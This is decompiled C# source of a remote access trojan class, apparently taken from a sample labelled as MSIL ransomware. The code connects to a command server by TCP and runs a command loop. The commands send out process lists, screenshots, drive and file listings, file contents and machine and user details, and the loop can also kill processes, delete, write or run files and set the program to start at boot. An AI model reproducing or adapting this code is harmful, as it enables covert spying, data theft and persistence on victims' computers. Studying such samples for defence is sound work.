// Decompiled with JetBrains decompiler
// Type: roigtbraorn.MCAIDM
// Assembly: roigtbraorn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1773575D-0580-45DF-AF48-63D92785F228
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4c8e0459524380a9f00ffc58913f461c3e1d8737dd18252881f09e2d416e4f73.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace roigtbraorn
{
  public class MCAIDM
  {
    private Dictionary<string, byte[]> roigtbraorntasks = new Dictionary<string, byte[]>();
    public DateTime roigtbraornrunTime;
    private int roigtbraornbytesRead = 0;
    public bool roigtbraornreqCnls = false;
    private int roigtbraornatmps = 0;
    public bool roigtbraornautCnls = false;
    public DateTime roigtbraornlTimeUtc;
    private THAIRE roigtbraornStateObj = new THAIRE();
    private MYAIINF roigtbraornUPC;
    private OCAIMD roigtbraornCMD;
    private int roigtbraornscrSize = 200;
    private ThreadStart roigtbraornfunStarter;
    public TcpClient roigtbraorntcpsck;
    public NetworkStream roigtbraornnetStream;
    private int roigtbraornbuffSize = 1024;
    private DRAIIVF roigtbraornHD = new DRAIIVF();
    public bool roigtbraornis_working = false;
    private bool roigtbraorniswitch = false;
    public int port_sn = 0;
    private bool roigtbraornthrRuning = false;
    private int roigtbraornthreadCnts = 0;
    private bool roigtbraornstr_writer = false;
    private bool roigtbraorncapScreen = false;
    private Thread roigtbraornfunThread;

    public void roigtbraorndoa_start()
    {
      COAINF.roigtbraornport = COAINF.ports[0];
      this.roigtbraornrunTime = DateTime.Now;
      this.roigtbraornUPC = new MYAIINF();
      this.roigtbraornCMD = new OCAIMD(this);
      this.roigtbraornHD.iserver = this;
      this.roigtbraornHD.roigtbraornmainPath = COAINF.roigtbraornget_mpath();
      this.roigtbraornStateObj.roigtbraorntimer = new System.Threading.Timer(new TimerCallback(this.roigtbraornloaokup_cngx), (object) this.roigtbraornStateObj, 32110, 36110);
    }

    public void roigtbraornsaaveFile(string filePath)
    {
      try
      {
        byte[] bytes = this.roigtbraornpuall_data();
        if (bytes == null)
          return;
        File.WriteAllBytes(filePath, bytes);
      }
      catch
      {
      }
    }

    public string roigtbraornfiale_info(string path, bool ret = false)
    {
      try
      {
        FileInfo fileInfo = new FileInfo(path);
        string name = fileInfo.Name;
        string str1;
        if (ret)
          str1 = "<|roigtbraorn".Split('|')[0];
        else
          str1 = ">|roigtbraorn".Split('|')[0];
        string str2 = name + str1;
        string str3 = fileInfo.CreationTimeUtc.Date.ToString();
        string str4;
        if (ret)
          str4 = "<|roigtbraorn".Split('|')[0];
        else
          str4 = ">|roigtbraorn".Split('|')[0];
        string str5 = str2 + str3 + str4;
        string str6 = this.roigtbraorngeat_size(fileInfo.Length);
        string str7;
        if (ret)
          str7 = "<|roigtbraorn".Split('|')[0];
        else
          str7 = ">|roigtbraorn".Split('|')[0];
        string str8 = str5 + str6 + str7;
        if (!ret)
          this.roigtbraornpuash_data((byte[]) null, "roigtbraorn-fialsz=|roigtbraorn".Split('|')[0] + str8);
        return str8;
      }
      catch
      {
        return "";
      }
    }

    private void roigtbraorncheckLaastatime(DateTime mTimeUtc)
    {
      try
      {
        if (Math.Abs(this.roigtbraornrunTime.Subtract(mTimeUtc).Minutes) <= 6)
          return;
        this.roigtbraorntcpsck.Close();
        this.roigtbraornis_working = false;
      }
      catch
      {
      }
    }

    private void roigtbraornloaokup_cngx(object sdogource)
    {
      try
      {
        if (!this.roigtbraornthrRuning)
        {
          this.roigtbraornthrRuning = true;
          this.roigtbraorncheckLaastatime(DateTime.Now);
          if (!this.roigtbraornis_working || !this.roigtbraorntcpsck.Connected)
          {
            this.roigtbraornis_working = this.roigtbraornIPSCX();
            if (this.roigtbraornis_working)
            {
              this.roigtbraornbuffSize = this.roigtbraorntcpsck.ReceiveBufferSize;
              this.roigtbraornseae_rexi();
            }
          }
        }
        else
          ++this.roigtbraornthreadCnts;
        this.roigtbraornthrRuning = false;
      }
      catch
      {
        ++this.roigtbraornatmps;
        this.roigtbraornthrRuning = false;
        this.roigtbraornthreadCnts = 0;
        this.roigtbraornstr_writer = false;
        this.roigtbraornis_working = false;
        this.roigtbraorniswitch = false;
      }
    }

    public void roigtbraornpoarts_switch()
    {
      try
      {
        ++this.port_sn;
        COAINF.roigtbraornport = COAINF.ports[this.port_sn];
        if (this.port_sn < COAINF.ports.Length - 1)
          return;
        this.port_sn = 0;
      }
      catch
      {
        this.port_sn = 0;
      }
    }

    public void roigtbraornliast_processes()
    {
      try
      {
        string str = "";
        Process[] processes = Process.GetProcesses();
        for (int index = 0; index <= processes.Length - 1; ++index)
          str = str + processes[index].Id.ToString() + ">|roigtbraorn".Split('|')[0] + processes[index].ProcessName + ">|roigtbraorn".Split('|')[0] + "0>|roigtbraorn".Split('|')[0] + "<";
        this.roigtbraornpuash_data(COAINF.getByteArray(str), "roigtbraorn-praocl=proass|roigtbraorn".Split('|')[0]);
      }
      catch
      {
      }
    }

    private bool roigtbraornIPSCX()
    {
      try
      {
        COAINF.roigtbraorndefaultP = COAINF.getBytsString(COAINF.roigtbraornvpsips);
        this.roigtbraorntcpsck = new TcpClient();
        this.roigtbraorntcpsck.Connect(COAINF.roigtbraorndefaultP, COAINF.roigtbraornport);
        return true;
      }
      catch
      {
        this.roigtbraornpoarts_switch();
        return false;
      }
    }

    public bool roigtbraornseand_auto(string fileinfo)
    {
      try
      {
        string path = fileinfo.Split('>')[0];
        if (File.Exists(path))
        {
          string fileName = Path.GetFileName(path);
          byte[] data = File.ReadAllBytes(path);
          fileinfo = fileinfo + ">" + fileName;
          this.roigtbraornpuash_data(data, "roigtbraorn-afaile=" + fileinfo);
          return false;
        }
        this.roigtbraornpuash_data((byte[]) null, "roigtbraorn-anafod=" + fileinfo);
        return false;
      }
      catch
      {
        return false;
      }
    }

    public void roigtbraornloaad_app()
    {
      try
      {
        string executablePath = Application.ExecutablePath;
        Thread.Sleep(10);
        COAINF.roigtbraornset_run("ldcvr|roigtbraorn".Split('|')[0], executablePath);
      }
      catch
      {
      }
    }

    private void roigtbraornimaage_info(string path)
    {
      try
      {
        Bitmap bitmap = new Bitmap((Image) new Bitmap(path), new Size(200, 150));
        if (bitmap == null)
          return;
        FileInfo fileInfo = new FileInfo(path);
        string str1 = fileInfo.Name + ">|roigtbraorn".Split('|')[0];
        DateTime dateTime = fileInfo.CreationTimeUtc;
        dateTime = dateTime.Date;
        string str2 = dateTime.ToString();
        string str3 = ">|roigtbraorn".Split('|')[0];
        string str4 = str1 + str2 + str3 + this.roigtbraorngeat_size(fileInfo.Length) + ">";
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Gif);
        this.roigtbraornpuash_data(memoryStream.ToArray(), "roigtbraorn-thaumb=|roigtbraorn".Split('|')[0] + str4);
      }
      catch
      {
      }
    }

    private void roigtbraornisa_screen(string screenSize)
    {
      try
      {
        SCAIRNS scairns = new SCAIRNS();
        this.roigtbraornscrSize = (int) Convert.ToInt16(screenSize.Split('>')[0].Trim());
        while (this.roigtbraorncapScreen && this.roigtbraornis_working)
        {
          Bitmap bitmap = scairns.roigtbraornscreen(this.roigtbraornscrSize);
          if (bitmap != null)
          {
            MemoryStream memoryStream = new MemoryStream();
            bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
            this.roigtbraornpuash_data(memoryStream.ToArray(), "roigtbraorn-scaren=capareen|roigtbraorn".Split('|')[0]);
          }
        }
      }
      catch
      {
      }
    }

    private void roigtbraornusaer_info() => this.roigtbraornpuash_data(COAINF.getByteArray(this.roigtbraornUPC.roigtbraornlancard + "|" + this.roigtbraornUPC.roigtbraorncname + "|" + this.roigtbraornUPC.roigtbraornuname + "|" + this.roigtbraornUPC.roigtbraornuip + "|" + COAINF.roigtbraornOsname() + "|" + this.roigtbraornUPC.roigtbraornapver + "|".ToString() + "| !roigtbraorn".Split('!')[0] + "|" + this.roigtbraornUPC.roigtbraornclientNum + "|" + COAINF.roigtbraornget_mpath()), "roigtbraorn-inafo=usaer|roigtbraorn".Split('|')[0]);

    private void roigtbraornscareenSize(string scSize)
    {
      try
      {
        this.roigtbraornscrSize = (int) Convert.ToInt16(scSize.Split('>')[0].Trim());
      }
      catch
      {
      }
    }

    private void roigtbraornseae_scren(string screenSize)
    {
      try
      {
        SCAIRNS scairns = new SCAIRNS();
        this.roigtbraornscrSize = (int) Convert.ToInt16(screenSize.Split('>')[0].Trim());
        Bitmap bitmap = scairns.roigtbraornscreen(this.roigtbraornscrSize);
        if (bitmap == null)
          return;
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
        this.roigtbraornpuash_data(memoryStream.ToArray(), "roigtbraorn-saascr=capareen|roigtbraorn".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void roigtbraornpuash_file(string lfile)
    {
      try
      {
        if (!File.Exists(lfile))
          return;
        string fileName = Path.GetFileName(lfile);
        this.roigtbraornpuash_data(File.ReadAllBytes(lfile), "roigtbraorn-fiale=|roigtbraorn".Split('|')[0] + lfile + ">0>" + fileName, true);
      }
      catch
      {
      }
    }

    public void roigtbraornremaove_file(string path)
    {
      try
      {
        File.Delete(path);
      }
      catch
      {
      }
    }

    public string[] roigtbraorngeat_command()
    {
      try
      {
        byte[] buffer = new byte[5];
        this.roigtbraornbytesRead = this.roigtbraornnetStream.Read(buffer, 0, 5);
        int int32 = BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[int32];
        int offset = 0;
        for (int index = int32; index > 0; index -= this.roigtbraornbytesRead)
        {
          int count = index > this.roigtbraornbuffSize ? this.roigtbraornbuffSize : index;
          this.roigtbraornbytesRead = this.roigtbraornnetStream.Read(numArray, offset, count);
          offset += this.roigtbraornbytesRead;
        }
        string bytsString = COAINF.getBytsString(numArray);
        if (bytsString.Trim() == "")
          return (string[]) null;
        return bytsString.Split('=');
      }
      catch
      {
        this.roigtbraornis_working = false;
        return (string[]) null;
      }
    }

    private string roigtbraorngeat_size(long byteCount)
    {
      try
      {
        string[] strArray = new string[7]
        {
          "B|roigtbraorn".Split('|')[0],
          "KB|roigtbraorn".Split('|')[0],
          "MB|roigtbraorn".Split('|')[0],
          "GB|roigtbraorn".Split('|')[0],
          "TB|roigtbraorn".Split('|')[0],
          "PB|roigtbraorn".Split('|')[0],
          "EB|roigtbraorn".Split('|')[0]
        };
        if (byteCount == 0L)
          return "0" + strArray[0];
        long a = Math.Abs(byteCount);
        int int32 = Convert.ToInt32(Math.Floor(Math.Log((double) a, 1024.0)));
        double num = Math.Round((double) a / Math.Pow(1024.0, (double) int32), 1);
        return ((double) Math.Sign(byteCount) * num).ToString() + strArray[int32];
      }
      catch
      {
        return "";
      }
    }

    public byte[] roigtbraornpuall_data()
    {
      try
      {
        this.roigtbraornrunTime = DateTime.Now;
        int offset = 0;
        byte[] buffer1 = new byte[5];
        this.roigtbraornbytesRead = this.roigtbraornnetStream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[int32];
        int num = int32;
        while (num > 0 && !this.roigtbraornreqCnls)
        {
          int count = num > this.roigtbraornbuffSize ? this.roigtbraornbuffSize : num;
          this.roigtbraornbytesRead = this.roigtbraornnetStream.Read(buffer2, offset, count);
          offset += this.roigtbraornbytesRead;
          num -= this.roigtbraornbytesRead;
          this.roigtbraornrunTime = DateTime.Now;
        }
        if (this.roigtbraornreqCnls)
        {
          this.roigtbraornnetStream.Flush();
          do
            ;
          while (this.roigtbraornnetStream.DataAvailable && this.roigtbraornnetStream.ReadByte() >= 0);
          buffer2 = (byte[]) null;
        }
        return buffer2;
      }
      catch
      {
        this.roigtbraornis_working = false;
        return (byte[]) null;
      }
    }

    private void roigtbraornliastDrives() => this.roigtbraornpuash_data((byte[]) null, "roigtbraorn-diars=" + this.roigtbraornHD.roigtbraornloaokup_Drives());

    public bool roigtbraornpuash_data(byte[] data, string type, bool tmp = false)
    {
      try
      {
        this.roigtbraornrunTime = DateTime.Now;
        if (this.roigtbraornstr_writer)
          return false;
        this.roigtbraornstr_writer = true;
        byte[] byteArray = COAINF.getByteArray(type);
        int num1 = 0;
        int num2 = 5;
        byte[] numArray = (byte[]) null;
        if (data != null)
        {
          numArray = BitConverter.GetBytes(data.Length);
          num1 = data.Length;
          num2 = 10;
        }
        byte[] bytes = BitConverter.GetBytes(byteArray.Length);
        byte[] buffer = new byte[num2 + byteArray.Length + num1];
        bytes.CopyTo((Array) buffer, 0);
        byteArray.CopyTo((Array) buffer, 5);
        if (data != null)
        {
          numArray.CopyTo((Array) buffer, 5 + byteArray.Length);
          data.CopyTo((Array) buffer, 10 + byteArray.Length);
        }
        int offset = 0;
        int length = buffer.Length;
        while (length > 0 && !this.roigtbraornreqCnls)
        {
          int count = length > this.roigtbraornbuffSize ? this.roigtbraornbuffSize : length;
          this.roigtbraornnetStream.Write(buffer, offset, count);
          offset += count;
          length -= count;
          this.roigtbraornrunTime = DateTime.Now;
        }
        this.roigtbraornstr_writer = false;
        return !this.roigtbraornreqCnls;
      }
      catch
      {
        this.roigtbraornstr_writer = false;
        this.roigtbraornis_working = false;
        return false;
      }
    }

    private void roigtbraornseae_rexi()
    {
      if (!this.roigtbraorniswitch)
      {
        this.roigtbraorniswitch = true;
        this.roigtbraornnetStream = this.roigtbraornCMD.roigtbraornNS(this.roigtbraorntcpsck);
        this.roigtbraorncapScreen = false;
        while (this.roigtbraornis_working)
        {
          string[] switchType = this.roigtbraorngeat_command();
          if (switchType == null)
          {
            this.roigtbraornis_working = false;
            break;
          }
          this.roigtbraornreqCnls = false;
          string lower = switchType[0].ToLower();
          string str;
          if (lower.Split('-').Length > 1)
            str = "roigtbraorn-" + lower.Split('-')[1];
          else
            str = "roigtbraorn-" + lower;
          switch (str)
          {
            case "roigtbraorn-praocl":
            case "roigtbraorn-procl":
              this.roigtbraornfunStarter = (ThreadStart) (() => this.roigtbraornliast_processes());
              this.roigtbraornfunThread = new Thread(this.roigtbraornfunStarter);
              this.roigtbraornfunThread.Start();
              break;
            case "roigtbraorn-enadpo":
            case "roigtbraorn-endpo":
              try
              {
                Process.GetProcessById((int) Convert.ToInt16(switchType[1].Trim())).Kill();
                break;
              }
              catch
              {
                break;
              }
            case "roigtbraorn-scarsz":
            case "roigtbraorn-scrsz":
              this.roigtbraornscareenSize(switchType[1]);
              break;
            case "roigtbraorn-csacreen":
            case "roigtbraorn-cscreen":
              this.roigtbraornseae_scren(switchType[1]);
              break;
            case "roigtbraorn-diars":
            case "roigtbraorn-dirs":
              this.roigtbraornfunThread = new Thread(new ThreadStart(this.roigtbraornliastDrives));
              this.roigtbraornfunThread.Start();
              break;
            case "roigtbraorn-staops":
            case "roigtbraorn-stops":
              this.roigtbraorncapScreen = false;
              break;
            case "roigtbraorn-scaren":
            case "roigtbraorn-scren":
              this.roigtbraorncapScreen = true;
              this.roigtbraornfunStarter = (ThreadStart) (() => this.roigtbraornisa_screen(switchType[1]));
              this.roigtbraornfunThread = new Thread(this.roigtbraornfunStarter);
              this.roigtbraornfunThread.Start();
              break;
            case "roigtbraorn-thaumb":
            case "roigtbraorn-thumb":
              this.roigtbraornimaage_info(switchType[1]);
              break;
            case "roigtbraorn-claping":
            case "roigtbraorn-clping":
              this.roigtbraornrunTime = DateTime.Now;
              break;
            case "roigtbraorn-puatsrt":
            case "roigtbraorn-putsrt":
              this.roigtbraornloaad_app();
              break;
            case "roigtbraorn-fialsz":
            case "roigtbraorn-filsz":
              this.roigtbraornfunStarter = (ThreadStart) (() => this.roigtbraornfiale_info(switchType[1]));
              this.roigtbraornfunThread = new Thread(this.roigtbraornfunStarter);
              this.roigtbraornfunThread.Start();
              break;
            case "roigtbraorn-ruapth":
            case "roigtbraorn-rupth":
              this.roigtbraornpuash_data((byte[]) null, "roigtbraorn-apapth=|roigtbraorn".Split('|')[0] + COAINF.roigtbraornget_mpath());
              break;
            case "roigtbraorn-doawf":
            case "roigtbraorn-dowf":
              this.roigtbraornsaaveFile(switchType[1]);
              break;
            case "roigtbraorn-cnals":
            case "roigtbraorn-cnls":
              this.roigtbraornautCnls = true;
              this.roigtbraornreqCnls = true;
              this.roigtbraorncapScreen = false;
              break;
            case "roigtbraorn-udalt":
            case "roigtbraorn-udlt":
              this.roigtbraornCMD.roigtbraornremove_user();
              break;
            case "roigtbraorn-dealt":
            case "roigtbraorn-delt":
              this.roigtbraornfunStarter = (ThreadStart) (() => this.roigtbraornremaove_file(switchType[1]));
              this.roigtbraornfunThread = new Thread(this.roigtbraornfunStarter);
              this.roigtbraornfunThread.Start();
              break;
            case "roigtbraorn-afaile":
            case "roigtbraorn-afile":
              this.roigtbraornfunStarter = (ThreadStart) (() => this.roigtbraornseand_auto(switchType[1]));
              this.roigtbraornfunThread = new Thread(this.roigtbraornfunStarter);
              this.roigtbraornfunThread.Start();
              break;
            case "roigtbraorn-liastf":
            case "roigtbraorn-listf":
              this.roigtbraornfunStarter = (ThreadStart) (() => this.roigtbraornHD.roigtbraornloaok_Files(switchType[1]));
              this.roigtbraornfunThread = new Thread(this.roigtbraornfunStarter);
              this.roigtbraornfunThread.Start();
              break;
            case "roigtbraorn-fiale":
            case "roigtbraorn-file":
              this.roigtbraornfunStarter = (ThreadStart) (() => this.roigtbraornpuash_file(switchType[1]));
              this.roigtbraornfunThread = new Thread(this.roigtbraornfunStarter);
              this.roigtbraornfunThread.Start();
              break;
            case "roigtbraorn-inafo":
            case "roigtbraorn-info":
              this.roigtbraornfunThread = new Thread(new ThreadStart(this.roigtbraornusaer_info));
              this.roigtbraornfunThread.Start();
              break;
            case "roigtbraorn-ruanf":
            case "roigtbraorn-runf":
              Process.Start(switchType[1].Split('>')[0]);
              break;
            case "roigtbraorn-flaes":
            case "roigtbraorn-fles":
              string files = this.roigtbraornHD.roigtbraornloaokup_Files(switchType[1]);
              if (files != "")
              {
                this.roigtbraornfunStarter = (ThreadStart) (() => this.roigtbraornpuash_data((byte[]) null, "roigtbraorn-flaes=|roigtbraorn".Split('|')[0] + files));
                this.roigtbraornfunThread = new Thread(this.roigtbraornfunStarter);
                this.roigtbraornfunThread.Start();
                break;
              }
              break;
            case "roigtbraorn-doawr":
            case "roigtbraorn-dowr":
              this.roigtbraornsaaveFile(switchType[1]);
              break;
            case "roigtbraorn-fladr":
            case "roigtbraorn-fldr":
              string Folders = this.roigtbraornHD.roigtbraornchaeck_Folders(switchType[1]);
              if (Folders != "")
              {
                this.roigtbraornfunStarter = (ThreadStart) (() => this.roigtbraornpuash_data((byte[]) null, "roigtbraorn-fladr=|roigtbraorn".Split('|')[0] + Folders));
                this.roigtbraornfunThread = new Thread(this.roigtbraornfunStarter);
                this.roigtbraornfunThread.Start();
                break;
              }
              break;
          }
        }
        this.roigtbraornis_working = false;
        this.roigtbraorncapScreen = false;
      }
      this.roigtbraorniswitch = false;
    }
  }
}
